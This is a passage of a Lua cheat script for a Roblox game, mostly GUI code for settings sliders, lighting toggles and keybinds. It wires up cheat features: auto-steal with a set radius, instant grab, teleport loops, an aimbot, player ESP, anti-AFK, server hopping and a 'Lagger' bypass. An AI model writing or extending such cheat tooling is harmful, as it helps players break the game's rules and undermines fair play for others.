		_agmV2.BackgroundColor3 = isV2 and C_ON_BG or C_OFF_BG; _agmV2.BackgroundTransparency = isV2 and 0.1 or 0.2
		_agmV2.TextColor3 = isV2 and C_MOON or C_DIM
	end
	setAutoGrabMethodUI = _agmRefresh
	_agmRefresh((_GH.getAutoGrabMethod and _GH.getAutoGrabMethod()) or 1)
	_agmV1.MouseButton1Click:Connect(function()
		if _GH.setAutoGrabMethod then _GH.setAutoGrabMethod(1) end
		_agmRefresh(1)
		if _GH.autoSave then _GH.autoSave() end
	end)
	_agmV2.MouseButton1Click:Connect(function()
		if _GH.setAutoGrabMethod then _GH.setAutoGrabMethod(2) end
		_agmRefresh(2)
		if _GH.autoSave then _GH.autoSave() end
	end)
	UIB.makeInputRow("Steal Radius",AutoSteal.Radius,function(n) if n and n>=1 and n<=500 then AutoSteal.Radius=n end end)
	UIB.makeInputRow("Steal Bar Size",100,function(n)
		if n and n>=60 and n<=200 then
			if _GH.setStealBarScale then _GH.setStealBarScale(n/100) end
		end
	end)
	local _autoTPEnabled = false
	local _autoTPConn    = nil
	local _autoTPHeight  = 20
	UIB.makeToggleRow("Auto TP Down", false, function(on)
		_autoTPEnabled = on
		if on then
			if _autoTPConn then pcall(function() task.cancel(_autoTPConn) end) end
			_autoTPConn = task.spawn(function()
				while _autoTPEnabled do
					task.wait(0.1)
					pcall(function()
						local char = LP.Character; if not char then return end
						local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
						local hum2 = char:FindFirstChildOfClass("Humanoid"); if not hum2 then return end
						if hum2.FloorMaterial ~= Enum.Material.Air then return end
						if root.Position.Y < _autoTPHeight then return end
						root.CFrame = CFrame.new(root.Position.X, -7.00, root.Position.Z)
							* CFrame.Angles(0, select(2, root.CFrame:ToEulerAnglesYXZ()), 0)
						root.AssemblyLinearVelocity = Vector3.zero
					end)
				end
			end)
		else
			if _autoTPConn then pcall(function() task.cancel(_autoTPConn) end); _autoTPConn = nil end
		end
	end)
	UIB.makeInputRow("TP Height (Y)", _autoTPHeight, function(n)
		if n >= 0 and n <= 500 then _autoTPHeight = n end
	end)
	local tpDownRow=Instance.new("Frame",currentPage)
	tpDownRow.Size=UDim2.new(1,0,0,32); tpDownRow.BackgroundColor3=C_ROW; tpDownRow.BackgroundTransparency=0.35
	tpDownRow.BorderSizePixel=0; tpDownRow.LayoutOrder=LO(); addCorner(tpDownRow,12); addLivingStroke(tpDownRow,1)
	local tpDownClk=Instance.new("TextButton",tpDownRow)
	tpDownClk.Size=UDim2.new(1,0,1,0); tpDownClk.BackgroundTransparency=1
	tpDownClk.Text="TP Down"; tpDownClk.TextColor3=C_WHITE; tpDownClk.Font=Enum.Font.GothamBold; tpDownClk.TextSize=10
	addLivingTextGradient(tpDownClk); tpDownClk.MouseButton1Click:Connect(tpToGround)
	local dropRow=Instance.new("Frame",currentPage)
	dropRow.Size=UDim2.new(1,0,0,32); dropRow.BackgroundColor3=C_ROW; dropRow.BackgroundTransparency=0.35
	dropRow.BorderSizePixel=0; dropRow.LayoutOrder=LO(); addCorner(dropRow,12); addLivingStroke(dropRow,1)
	local dropClk=Instance.new("TextButton",dropRow)
	dropClk.Size=UDim2.new(1,0,1,0); dropClk.BackgroundTransparency=1
	dropClk.Text="Drop Brainrot"; dropClk.TextColor3=C_WHITE; dropClk.Font=Enum.Font.GothamBold; dropClk.TextSize=10
	addLivingTextGradient(dropClk); dropClk.MouseButton1Click:Connect(runDropBrainrot)
	UIB.makeGap(4); UIB.makeSectionLabel("Egg Farm")
	UIB.makeToggleRow("Instant Grab",false,function(on)
		_YE.setInstantGrab(on)
	end)
	UIB.makeToggleRow("Auto Farm Eggs",false,function(on)
		State.autoFarm=on; if not on then _YE.farmFullStopRef() end
	end)
	UIB.makeToggleRow("Auto Hatch",false,function(on) State.autoHatch=on end)
	UIB.makeToggleRow("Auto Equip Best",false,function(on) State.autoEquip=on end)
	UIB.makeToggleRow("Auto Claim",false,function(on) State.autoClaim=on end)
	UIB.makeToggleRow("Auto Upgrade Pen",false,function(on) State.autoUpgradePen=on end)
	UIB.makeToggleRow("Auto Upgrade Treadmill",false,function(on) State.autoUpgradeTM=on end)
	UIB.makeToggleRow("Auto Run Treadmill",false,function(on) State.autoRunTreadmill=on end)
	UIB.makeGap(4); UIB.makeSectionLabel("yslemEgg AimBat")
	UIB.makeToggleRow("YE AimBat",false,function(on)
		if on then _YE.startAimBat() else _YE.stopAimBat() end
	end)
	do
		local _yeHopRow=Instance.new("Frame",currentPage)
		_yeHopRow.Size=UDim2.new(1,0,0,32); _yeHopRow.BackgroundColor3=C_ROW; _yeHopRow.BackgroundTransparency=0.35
		_yeHopRow.BorderSizePixel=0; _yeHopRow.LayoutOrder=LO(); addCorner(_yeHopRow,12); addLivingStroke(_yeHopRow,1)
		local _yeHopClk=Instance.new("TextButton",_yeHopRow)
		_yeHopClk.Size=UDim2.new(1,0,1,0); _yeHopClk.BackgroundTransparency=1
		_yeHopClk.Text="Server Hop"; _yeHopClk.TextColor3=C_WHITE; _yeHopClk.Font=Enum.Font.GothamBold; _yeHopClk.TextSize=10
		addLivingTextGradient(_yeHopClk); _yeHopClk.MouseButton1Click:Connect(function() _YE.hopServer() end)
	end
end)

-- Declared here (before buildPage Visual) to be visible in applyScale.
-- "Spawnable" floating button system (replaces the fixed Quick Panel +
-- attach/detach): each action has a toggle in Settings that shows/hides
-- its floating button. "Lock" freezes the drag of all
-- currently displayed buttons.
local _floatDefs      = {}   -- id -> {label, onClick, isActive, momentary}
local _floatBtns      = {}   -- id -> {frame, setActive}
local _floatPositions = {}   -- id -> {xs,xo,ys,yo}
-- Bump this whenever the default layout changes: saved positions from an
-- older version get discarded on load instead of restoring stale/overlapping
-- coordinates, so everyone gets the current clean column layout by default.
local _FLOAT_POS_VERSION = 15  -- bumped: default grid now carries more gap (was 3px, now 8px)
local _floatLocked    = false
-- Same idea as _FLOAT_POS_VERSION above, but for makeDraggable's generic
-- `positions` table (Lagger, the main window…): bump this
-- whenever a widget's DEFAULT position moves, so a save made under the old
-- default gets discarded once instead of permanently overriding the new
-- one — after that first clean load, dragging a widget saves and restores
-- normally again, like every other window.
local _POSITIONS_VERSION = 2  -- bumped: Lagger's default position moved (was off-screen on some devices)
-- "Move Together": when on, dragging any one spawned floating button
-- carries every other spawned one along by the same delta, so the whole
-- group can be repositioned in a single drag instead of one at a time.
local _floatLinkMove     = false
local _linkDragSnapshot  = nil  -- id -> Position, captured at drag-start while link-move is on
local function setFloatLinkMove(on) _floatLinkMove = on end
_GH.setFloatLinkMove = setFloatLinkMove
local FLOAT_SZ = 46

-- Stable order (independent of activation order) so buttons always line
-- up the same way: a tight 2-wide grid. Declared here (not next to
-- makeFloatButton further down) so both makeFloatButton AND the "Button
-- Size" slider in applyScale can share the exact same position formula —
-- previously the slider only grew each button's Size and never touched
-- Position, so at high scale neighbouring buttons grew into each other.
local _FLOAT_GRID_ORDER = {
	"aimbot","aimv2","dropbr","autoleft",
	"autoright","tpdown","battp","instareset",
}
local function _floatGridIndex(id)
	for i, fid in ipairs(_FLOAT_GRID_ORDER) do
		if fid == id then return i end
	end
	return #_FLOAT_GRID_ORDER + 1
end
local FLOAT_GAP = 8  -- was 3 — the extra room the user asked for
local function _floatGridPos(id, sz)
	local idx = _floatGridIndex(id) - 1
	local col = idx % 2
	local row = math.floor(idx / 2)
	local topOffset = 40
	local blockW = sz * 2 + FLOAT_GAP
	return UDim2.new(1, -(blockW + 12) + col * (sz + FLOAT_GAP), 0, topOffset + row * (sz + FLOAT_GAP))
end

-- Clears every custom-dragged floating-button position and snaps whatever
-- is currently spawned back to the default grid. Used by the "Reset
-- Position" button in Settings (alongside resetMainPosition).
local function resetFloatPositions()
	for k in pairs(_floatPositions) do _floatPositions[k] = nil end
	for id, entry in pairs(_floatBtns) do
		if entry.frame and entry.frame.Parent then
			TweenService:Create(entry.frame, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
				{Position = _floatGridPos(id, FLOAT_SZ)}):Play()
		end
	end
	if _GH.autoSave then _GH.autoSave() end
end
_GH.resetFloatPositions = resetFloatPositions

-- Declared here (before buildPage Settings) so the
-- Lagger toggle can reference the widget built further
-- down in the file — otherwise the closure captures a nil global (same
-- trap as the mainFrame bug fixed earlier).
local _lgrBypassWidget = nil

-- Speed Booster "edited" size (via the Visual tab's Scale slider)
-- — shared with the widget's "-" button so it doesn't revert
-- to a hardcoded default size when shrinking/expanding.
-- [PULSE] hauteur 160 -> 200 : +40px pour loger la rangée de toggle
-- "Pulse" ajoutée sous Speed/Steal Spd dans le panneau Normal.
local _spExpandedSize = {w = 150, h = 160}
local _spCollapsed    = false

buildPage("Visual", function()
	-- ── FLOATING BUTTON SCALE ─────────────────────────────────────────
	-- Size of spawnable buttons. Scale 1=min(40px) → 10=max(74px).
	-- Stores the current value so the slider reflects the real state.
	UIB.makeSectionLabel("Button Size")
	UIB.makeGap(2)

	-- Display the current value
	local scaleValLbl = Instance.new("TextLabel", currentPage)
	scaleValLbl.Size = UDim2.new(1,0,0,18); scaleValLbl.BackgroundTransparency = 1
	scaleValLbl.Text = "Scale: 5 / 10"
	scaleValLbl.TextColor3 = C_MOON2; scaleValLbl.Font = Enum.Font.GothamBold; scaleValLbl.TextSize = 10
	scaleValLbl.TextXAlignment = Enum.TextXAlignment.Left; scaleValLbl.LayoutOrder = LO()
	addLivingTextGradient(scaleValLbl)

	-- Slider track
	local trackWrap = Instance.new("Frame", currentPage)
	trackWrap.Size = UDim2.new(1,0,0,32); trackWrap.BackgroundColor3 = C_ROW
	trackWrap.BackgroundTransparency = 0.35; trackWrap.BorderSizePixel = 0; trackWrap.LayoutOrder = LO()
	addCorner(trackWrap, 12); addLivingStroke(trackWrap, 1)

	local track = Instance.new("Frame", trackWrap)
	track.Size = UDim2.new(1,-28,0,4); track.Position = UDim2.new(0,14,0.5,-2)
	track.BackgroundColor3 = C_DEEP2; track.BorderSizePixel = 0
	addCorner(track, 2)

	local trackFill = Instance.new("Frame", track)
	trackFill.Size = UDim2.new(0.4,0,1,0)   -- 0.4 = initial position (scale 5 of 10)
	trackFill.BackgroundColor3 = C_MOON; trackFill.BorderSizePixel = 0
	addCorner(trackFill, 2)
	addLivingTextGradient(trackFill)

	local thumb = Instance.new("TextButton", trackWrap)
	thumb.Size = UDim2.new(0,16,0,16); thumb.AnchorPoint = Vector2.new(0.5,0.5)
	thumb.Position = UDim2.new(0.4,14,0.5,0)   -- initial position synced with fill
	thumb.BackgroundColor3 = C_WHITE; thumb.BorderSizePixel = 0; thumb.Text = ""
	thumb.AutoButtonColor = false; thumb.ZIndex = 5
	addCorner(thumb, 8); addLivingStroke(thumb, 1)

	-- Slider drag logic (no dragPosLabel)
	local _scaleVal = 5     -- current value 1-10
	local _thumbDrag = false
	local _trackAbsX, _trackAbsW = 0, 1

	local function applyScale(v)
		_scaleVal = math.clamp(math.floor(v + 0.5), 1, 10)
		local t = (_scaleVal - 1) / 9
		trackFill.Size = UDim2.new(t, 0, 1, 0)
		thumb.Position = UDim2.new(0, 14 + t * math.max(_trackAbsW - 1, 1), 0.5, 0)
		scaleValLbl.Text = "Scale: " .. _scaleVal .. " / 10"

		-- Range: 34px (scale 1) → 70px (scale 10) — floating button size
		local newSz = 34 + math.floor((_scaleVal - 1) * (70 - 34) / 9)
		FLOAT_SZ = newSz
		for id, entry in pairs(_floatBtns) do
			if entry.frame and entry.frame.Parent then
				entry.frame.Size = UDim2.new(0, newSz, 0, newSz)
				-- Only grid-default buttons get repositioned — anything the
				-- user has dragged to a custom spot keeps that spot (growing
				-- in place there), same as before. This is what fixes buttons
				-- overlapping each other as the size grows: previously only
				-- Size changed here and Position never followed along.
				if not _floatPositions[id] then
					entry.frame.Position = _floatGridPos(id, newSz)
				end
			end
		end
	end

	thumb.InputBegan:Connect(function(inp)
		if inp.UserInputType == Enum.UserInputType.MouseButton1
			or inp.UserInputType == Enum.UserInputType.Touch then
			_thumbDrag = true
			_trackAbsX = track.AbsolutePosition.X
			_trackAbsW = track.AbsoluteSize.X
		end
	end)
	UIS.InputChanged:Connect(function(inp)
		if not _thumbDrag then return end
		if inp.UserInputType == Enum.UserInputType.MouseMovement
			or inp.UserInputType == Enum.UserInputType.Touch then
			local rel = math.clamp((inp.Position.X - _trackAbsX) / _trackAbsW, 0, 1)
			applyScale(1 + rel * 9)
		end
	end)
	UIS.InputEnded:Connect(function(inp)
		if inp.UserInputType == Enum.UserInputType.MouseButton1
			or inp.UserInputType == Enum.UserInputType.Touch then
			_thumbDrag = false
		end
	end)
	-- Direct click on the track
	local trackBtn = Instance.new("TextButton", trackWrap)
	trackBtn.Size = UDim2.new(1,0,1,0); trackBtn.BackgroundTransparency = 1; trackBtn.Text = ""
	trackBtn.ZIndex = 4
	trackBtn.MouseButton1Click:Connect(function()
		_trackAbsX = track.AbsolutePosition.X
		_trackAbsW = track.AbsoluteSize.X
		local mPos = UIS:GetMouseLocation()
		local rel = math.clamp((mPos.X - _trackAbsX) / _trackAbsW, 0, 1)
		applyScale(1 + rel * 9)
	end)

	-- ── UI SCALE (main hub size) ──────────────────────────────────────
	UIB.makeGap(6)
	UIB.makeSectionLabel("UI Scale")

	local uiScaleValLbl = Instance.new("TextLabel", currentPage)
	uiScaleValLbl.Size = UDim2.new(1,0,0,18); uiScaleValLbl.BackgroundTransparency = 1
	uiScaleValLbl.Text = "Scale: 5 / 10"
	uiScaleValLbl.TextColor3 = C_MOON2; uiScaleValLbl.Font = Enum.Font.GothamBold; uiScaleValLbl.TextSize = 10
	uiScaleValLbl.TextXAlignment = Enum.TextXAlignment.Left; uiScaleValLbl.LayoutOrder = LO()
	addLivingTextGradient(uiScaleValLbl)

	local uiTrackWrap = Instance.new("Frame", currentPage)
	uiTrackWrap.Size = UDim2.new(1,0,0,32); uiTrackWrap.BackgroundColor3 = C_ROW
	uiTrackWrap.BackgroundTransparency = 0.35; uiTrackWrap.BorderSizePixel = 0; uiTrackWrap.LayoutOrder = LO()
	addCorner(uiTrackWrap, 12); addLivingStroke(uiTrackWrap, 1)

	local uiTrack = Instance.new("Frame", uiTrackWrap)
	uiTrack.Size = UDim2.new(1,-28,0,4); uiTrack.Position = UDim2.new(0,14,0.5,-2)
	uiTrack.BackgroundColor3 = C_DEEP2; uiTrack.BorderSizePixel = 0
	addCorner(uiTrack, 2)

	local uiTrackFill = Instance.new("Frame", uiTrack)
	uiTrackFill.Size = UDim2.new(0.4,0,1,0)
	uiTrackFill.BackgroundColor3 = C_MOON; uiTrackFill.BorderSizePixel = 0
	addCorner(uiTrackFill, 2); addLivingTextGradient(uiTrackFill)

	local uiThumb = Instance.new("TextButton", uiTrackWrap)
	uiThumb.Size = UDim2.new(0,16,0,16); uiThumb.AnchorPoint = Vector2.new(0.5,0.5)
	uiThumb.Position = UDim2.new(0.4,14,0.5,0)
	uiThumb.BackgroundColor3 = C_WHITE; uiThumb.BorderSizePixel = 0; uiThumb.Text = ""
	uiThumb.AutoButtonColor = false; uiThumb.ZIndex = 5
	addCorner(uiThumb, 8); addLivingStroke(uiThumb, 1)

	-- WIN_W=300, WIN_H=340 — scale 1=60% → 10=140%
	local _uiScaleVal  = 5
	local _uiThumbDrag = false
	local _uiTrackAbsX, _uiTrackAbsW = 0, 1

	local function applyUIScale(v)
		_uiScaleVal = math.clamp(math.floor(v + 0.5), 1, 10)
		local t   = (_uiScaleVal - 1) / 9
		uiTrackFill.Size    = UDim2.new(t, 0, 1, 0)
		local absW = uiTrack.AbsoluteSize.X
		if absW > 2 then
			uiThumb.Position = UDim2.new(0, 14 + t * absW, 0.5, 0)
		end
		uiScaleValLbl.Text  = "Scale: " .. _uiScaleVal .. " / 10"
		local factor = 0.6 + t * 0.8
		if mainOuter and mainOuter.Parent then
			-- UIScale resizes everything proportionally (text, rows, spacing)
			-- instead of just shrinking the frame — nothing gets cut off
			-- by ClipsDescendants, unlike the old direct resize.
			mainUIScale.Scale = factor
			local scaledW = WIN_W * factor
			mainOuter.Position = UDim2.new(0.5, -scaledW/2, 0.5, -137)
		end
	end
	_GH.applyUIScale = applyUIScale
	_GH.getUIScale   = function() return _uiScaleVal end

	uiThumb.InputBegan:Connect(function(inp)
		if inp.UserInputType == Enum.UserInputType.MouseButton1
			or inp.UserInputType == Enum.UserInputType.Touch then
			_uiThumbDrag = true
			_uiTrackAbsX = uiTrack.AbsolutePosition.X
			_uiTrackAbsW = uiTrack.AbsoluteSize.X
		end
	end)
	UIS.InputChanged:Connect(function(inp)
		if not _uiThumbDrag then return end
		if inp.UserInputType == Enum.UserInputType.MouseMovement
			or inp.UserInputType == Enum.UserInputType.Touch then
			local rel = math.clamp((inp.Position.X - _uiTrackAbsX) / _uiTrackAbsW, 0, 1)
			applyUIScale(1 + rel * 9)
		end
	end)
	UIS.InputEnded:Connect(function(inp)
		if inp.UserInputType == Enum.UserInputType.MouseButton1
			or inp.UserInputType == Enum.UserInputType.Touch then
			_uiThumbDrag = false
		end
	end)
	local uiTrackBtn = Instance.new("TextButton", uiTrackWrap)
	uiTrackBtn.Size = UDim2.new(1,0,1,0); uiTrackBtn.BackgroundTransparency = 1; uiTrackBtn.Text = ""
	uiTrackBtn.ZIndex = 4
	uiTrackBtn.MouseButton1Click:Connect(function()
		_uiTrackAbsX = uiTrack.AbsolutePosition.X
		_uiTrackAbsW = uiTrack.AbsoluteSize.X
		local mPos = UIS:GetMouseLocation()
		local rel  = math.clamp((mPos.X - _uiTrackAbsX) / _uiTrackAbsW, 0, 1)
		applyUIScale(1 + rel * 9)
	end)

	UIB.makeGap(4)
	UIB.makeSectionLabel("Lighting")
	UIB.makeToggleRow("Fullbright",false,function(on) Lighting.Brightness=on and 10 or 1 end)
	UIB.makeToggleRow("Shadows OFF",false,function(on) Lighting.GlobalShadows=not on end)
	UIB.makeToggleRow("Fog OFF",false,function(on) Lighting.FogEnd=on and 9e9 or 1000 end)
	UIB.makeInputRow("FOV",70,function(n) if n>=30 and n<=120 then workspace.CurrentCamera.FieldOfView=n end end)
	UIB.makeGap(4)
	UIB.makeSectionLabel("Sky & Atmosphere")
	local _dBri,_dClock,_dAmb,_dOut,_dFogE,_dFogC = Lighting.Brightness,Lighting.ClockTime,Lighting.Ambient,Lighting.OutdoorAmbient,Lighting.FogEnd,Lighting.FogColor
	UIB.makeToggleRow("Dark Mode",false,function(on)
		if on then
			local s=Lighting:FindFirstChild("MoonDS") or Instance.new("Sky"); s.Name="MoonDS"
			s.SkyboxBk="rbxassetid://159454299";s.SkyboxDn="rbxassetid://159454296";s.SkyboxFt="rbxassetid://159454293"
			s.SkyboxLf="rbxassetid://159454286";s.SkyboxRt="rbxassetid://159454289";s.SkyboxUp="rbxassetid://159454291";s.Parent=Lighting
			Lighting.Brightness=0;Lighting.ClockTime=0;Lighting.OutdoorAmbient=Color3.fromRGB(0,0,0)
		else
			local s=Lighting:FindFirstChild("MoonDS");if s then s:Destroy() end
			Lighting.Brightness=_dBri;Lighting.ClockTime=_dClock;Lighting.OutdoorAmbient=_dOut
		end
	end)
	UIB.makeToggleRow("Cloudy Blue",false,function(on)
		if on then
			Lighting.ClockTime=7;Lighting.Brightness=1.2;Lighting.FogEnd=800;Lighting.FogColor=Color3.fromRGB(160,190,255)
			Lighting.Ambient=Color3.fromRGB(190,200,230);Lighting.OutdoorAmbient=Color3.fromRGB(200,210,240)
			local cc=Lighting:FindFirstChildOfClass("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect",Lighting)
			cc.TintColor=Color3.fromRGB(180,210,255);cc.Saturation=0.12;cc.Brightness=0.04
		else
			Lighting.ClockTime=_dClock;Lighting.Brightness=_dBri;Lighting.FogEnd=_dFogE;Lighting.FogColor=_dFogC
			Lighting.Ambient=_dAmb;Lighting.OutdoorAmbient=_dOut
			local cc=Lighting:FindFirstChildOfClass("ColorCorrectionEffect");if cc then cc:Destroy() end
		end
	end)

	-- Speed Booster Scale
	UIB.makeGap(4)
	UIB.makeSectionLabel("Speed Booster Scale")
	do
		local spScaleValLbl=Instance.new("TextLabel",currentPage)
		spScaleValLbl.Size=UDim2.new(1,0,0,18); spScaleValLbl.BackgroundTransparency=1
		spScaleValLbl.Text="Scale: 5 / 10"; spScaleValLbl.TextColor3=C_MOON2
		spScaleValLbl.Font=Enum.Font.GothamBold; spScaleValLbl.TextSize=10
		spScaleValLbl.TextXAlignment=Enum.TextXAlignment.Left; spScaleValLbl.LayoutOrder=LO()
		addLivingTextGradient(spScaleValLbl)
		local spScWrap=Instance.new("Frame",currentPage)
		spScWrap.Size=UDim2.new(1,0,0,32); spScWrap.BackgroundColor3=C_ROW
		spScWrap.BackgroundTransparency=0.35; spScWrap.BorderSizePixel=0; spScWrap.LayoutOrder=LO()
		addCorner(spScWrap,12); addLivingStroke(spScWrap,1)
		local spScTrk=Instance.new("Frame",spScWrap)
		spScTrk.Size=UDim2.new(1,-28,0,4); spScTrk.Position=UDim2.new(0,14,0.5,-2)
		spScTrk.BackgroundColor3=C_DEEP2; spScTrk.BorderSizePixel=0; addCorner(spScTrk,2)
		local spScFill=Instance.new("Frame",spScTrk)
		spScFill.Size=UDim2.new(0.44,0,1,0); spScFill.BackgroundColor3=C_MOON; spScFill.BorderSizePixel=0
		addCorner(spScFill,2)
		local spScThumb=Instance.new("TextButton",spScWrap)
		spScThumb.Size=UDim2.new(0,16,0,16); spScThumb.AnchorPoint=Vector2.new(0.5,0.5)
		spScThumb.Position=UDim2.new(0,14+0.44*(spScWrap.AbsoluteSize.X or 100),0.5,0)
		spScThumb.BackgroundColor3=C_WHITE; spScThumb.BorderSizePixel=0; spScThumb.Text=""
		spScThumb.AutoButtonColor=false; spScThumb.ZIndex=5
		addCorner(spScThumb,8); addLivingStroke(spScThumb,1)
		local _sv=5; local _sd=false
		local SP_W=180; local SP_H=194
		local function apSpSc(v)
			_sv=math.clamp(math.floor(v+0.5),1,10)
			local t=(_sv-1)/9
			spScFill.Size=UDim2.new(t,0,1,0)
			local aw=spScTrk.AbsoluteSize.X; if aw>2 then spScThumb.Position=UDim2.new(0,14+t*aw,0.5,0) end
			spScaleValLbl.Text="Scale: ".._sv.." / 10"
			local f=0.6+t*0.8
			_spExpandedSize.w = math.floor(SP_W*f)
			_spExpandedSize.h = math.floor(SP_H*f)
			-- Only resize visually if the widget isn't collapsed
			-- ("-"), otherwise the edited size is just remembered for later.
			if _GH.spW and not _spCollapsed then
				_GH.spW.Size=UDim2.new(0,_spExpandedSize.w,0,_spExpandedSize.h)
			end
		end
		spScThumb.InputBegan:Connect(function(inp)
			if inp.UserInputType==Enum.UserInputType.MouseButton1 or inp.UserInputType==Enum.UserInputType.Touch then _sd=true end
		end)
		UIS.InputChanged:Connect(function(inp)
			if not _sd then return end
			if inp.UserInputType==Enum.UserInputType.MouseMovement or inp.UserInputType==Enum.UserInputType.Touch then
				local ax=spScTrk.AbsolutePosition.X; local aw=spScTrk.AbsoluteSize.X; if aw<2 then return end
				apSpSc(1+math.clamp((inp.Position.X-ax)/aw,0,1)*9)
			end
		end)
		UIS.InputEnded:Connect(function(inp)
			if inp.UserInputType==Enum.UserInputType.MouseButton1 or inp.UserInputType==Enum.UserInputType.Touch then _sd=false end
		end)
	end

	-- ── CHARACTER (cosmetic, local only) ──────────────────────────────
	UIB.makeGap(6); UIB.makeSectionLabel("Character")
	UIB.makeToggleRow("Headless",false,function(on)
		Charter.headlessEnabled=on; Charter.applyHeadless(LP.Character,on)
	end)
	UIB.makeToggleRow("Korblox",false,function(on)
		Charter.korbloxEnabled=on; Charter.applyKorblox(LP.Character,on)
	end)

	UIB.makeGap(6); UIB.makeSectionLabel("ESP")
	-- Controls the speed billboard already shown above other players'
	-- heads (this existed before, always-on, no toggle). Default ON here
	-- matches that existing always-on behavior exactly — turn it off to
	-- hide it.
	UIB.makeToggleRow("Speed ESP",true,function(on)
		if _GH.setSpeedESPVisible then _GH.setSpeedESPVisible(on) end
	end)
	UIB.makeGap(4); UIB.makeSectionLabel("Egg Visual")
	UIB.makeToggleRow("Egg ESP",false,function(on)
		State.esp=on; if on then _YE.startESP() else _YE.stopESP() end
	end)
	UIB.makeToggleRow("FPS Boost",false,function(on)
		State.fpsBoost=on; if on then _YE.applyFpsBoost() end
	end)
	UIB.makeToggleRow("Anti AFK",false,function(on)
		State.antiAFK=on; if on then _YE.startAntiAFK() else _YE.stopAntiAFK() end
	end)
end)

buildPage("Keybind", function()
	-- ================================================================
	-- Keybind system: PC keyboard + PlayStation/Xbox controller
	-- Inspired by Amir Hub — one "..." button per action, click → listens
	-- for the next key pressed (keyboard or gamepad)
	-- ================================================================

	-- Central bindings table (exposed for saving)
	local KB = _GH.MH_KB or {
		DropBR        = {key=nil, gp=nil},
		AutoLeft      = {key=nil, gp=nil},
		AimBot        = {key=nil, gp=nil},
		AutoRight     = {key=nil, gp=nil},
		TPDown        = {key=nil, gp=nil},
		LagNorm       = {key=nil, gp=nil},
		BatTP         = {key=nil, gp=nil},
		AimV2         = {key=nil, gp=nil},
		AimV3Kb       = {key=nil, gp=nil},
		InstantReset  = {key=nil, gp=nil},
		HideUI        = {key=nil, gp=nil},
	}
	_GH.MH_KB = KB

	local GAMEPAD_KEYS = {
		[Enum.KeyCode.ButtonA]=true,[Enum.KeyCode.ButtonB]=true,
		[Enum.KeyCode.ButtonX]=true,[Enum.KeyCode.ButtonY]=true,
		[Enum.KeyCode.ButtonL1]=true,[Enum.KeyCode.ButtonR1]=true,
		[Enum.KeyCode.ButtonL2]=true,[Enum.KeyCode.ButtonR2]=true,
		[Enum.KeyCode.ButtonL3]=true,[Enum.KeyCode.ButtonR3]=true,
		[Enum.KeyCode.ButtonStart]=true,[Enum.KeyCode.ButtonSelect]=true,
		[Enum.KeyCode.DPadUp]=true,[Enum.KeyCode.DPadDown]=true,
		[Enum.KeyCode.DPadLeft]=true,[Enum.KeyCode.DPadRight]=true,
	}

	-- Short readable names for display on the button
	local function keyName(kc)
		if not kc then return "—" end
		local n = tostring(kc):gsub("Enum.KeyCode.", "")
		local map = {
			LeftControl="LCTRL", RightControl="RCTRL",
			LeftShift="LSHIFT", RightShift="RSHIFT",
			LeftAlt="LALT", RightAlt="RALT",
			LeftBracket="[", RightBracket="]",
			ButtonA="✕", ButtonB="○", ButtonX="□", ButtonY="△",
			ButtonL1="L1", ButtonR1="R1", ButtonL2="L2", ButtonR2="R2",
			ButtonL3="L3", ButtonR3="R3",
			ButtonStart="START", ButtonSelect="SEL",
			DPadUp="D↑", DPadDown="D↓", DPadLeft="D←", DPadRight="D→",
		}
		return map[n] or n:sub(1,6)
	end

	local _currentListeningBtn = nil  -- reference to the listening button, only one at a time

	local function makeKBRow(labelTxt, entry)
		local row = Instance.new("Frame", currentPage)
		row.Size = UDim2.new(1,0,0,32); row.BackgroundColor3 = C_ROW
		row.BackgroundTransparency = 0.35; row.BorderSizePixel = 0; row.LayoutOrder = LO()
		addCorner(row, 12); addLivingStroke(row, 1)
		row.MouseEnter:Connect(function() TweenService:Create(row,TweenInfo.new(0.1),{BackgroundTransparency=0.15}):Play() end)
		row.MouseLeave:Connect(function() TweenService:Create(row,TweenInfo.new(0.1),{BackgroundTransparency=0.35}):Play() end)

		local lbl = Instance.new("TextLabel", row)
		lbl.Size = UDim2.new(1,-90,1,0); lbl.Position = UDim2.new(0,12,0,0)
		lbl.BackgroundTransparency = 1; lbl.Text = labelTxt
		lbl.TextColor3 = C_WHITE; lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 10
		lbl.TextXAlignment = Enum.TextXAlignment.Left
		addLivingTextGradient(lbl)

		local kbWrap = Instance.new("Frame", row)
		kbWrap.Size = UDim2.new(0,72,0,22); kbWrap.Position = UDim2.new(1,-80,0.5,-11)
		kbWrap.BackgroundColor3 = C_ON_BG; kbWrap.BackgroundTransparency = 0.2; kbWrap.BorderSizePixel = 0
		addCorner(kbWrap, 6); addLivingStroke(kbWrap, 1)

		local kbBtn = Instance.new("TextButton", kbWrap)
		kbBtn.Size = UDim2.new(1,0,1,0); kbBtn.BackgroundTransparency = 1
		kbBtn.Text = keyName(entry.key or entry.gp)
		kbBtn.TextColor3 = C_MOON2; kbBtn.Font = Enum.Font.GothamBold; kbBtn.TextSize = 9
		kbBtn.AutoButtonColor = false

		local conn = nil
		local timeoutThread = nil

		local function stopListening(newText)
			if conn then conn:Disconnect(); conn = nil end
			if timeoutThread then pcall(task.cancel, timeoutThread); timeoutThread = nil end
			kbBtn.Text = newText or keyName(entry.key or entry.gp)
			kbBtn.TextColor3 = C_MOON2
			if _currentListeningBtn == kbBtn then _currentListeningBtn = nil end
		end

		kbBtn.MouseButton1Click:Connect(function()
			-- If this button is already listening → cancel
			if _currentListeningBtn == kbBtn then
				stopListening(); return
			end
			-- If another button is listening → cancel it first (via its own conn)
			if _currentListeningBtn then
				-- the previous button will clean itself up via its timeout or next click
				_currentListeningBtn = nil
			end
			_currentListeningBtn = kbBtn
			local prev = kbBtn.Text
			kbBtn.Text = "..."; kbBtn.TextColor3 = C_SILVER2

			conn = UIS.InputBegan:Connect(function(inp, gpe)
				if inp.KeyCode == Enum.KeyCode.Unknown then return end
				if inp.UserInputType ~= Enum.UserInputType.Keyboard
					and not GAMEPAD_KEYS[inp.KeyCode] then return end
				if GAMEPAD_KEYS[inp.KeyCode] then
					entry.gp = inp.KeyCode; entry.key = nil
				else
					entry.key = inp.KeyCode; entry.gp = nil
				end
				stopListening(keyName(inp.KeyCode))
				if _GH.autoSave then _GH.autoSave() end
			end)

			-- 6s timeout if no key is pressed
			timeoutThread = task.delay(6, function()
				stopListening(prev)
			end)
		end)

		-- ✕ clears
		local clrBtn = Instance.new("TextButton", row)
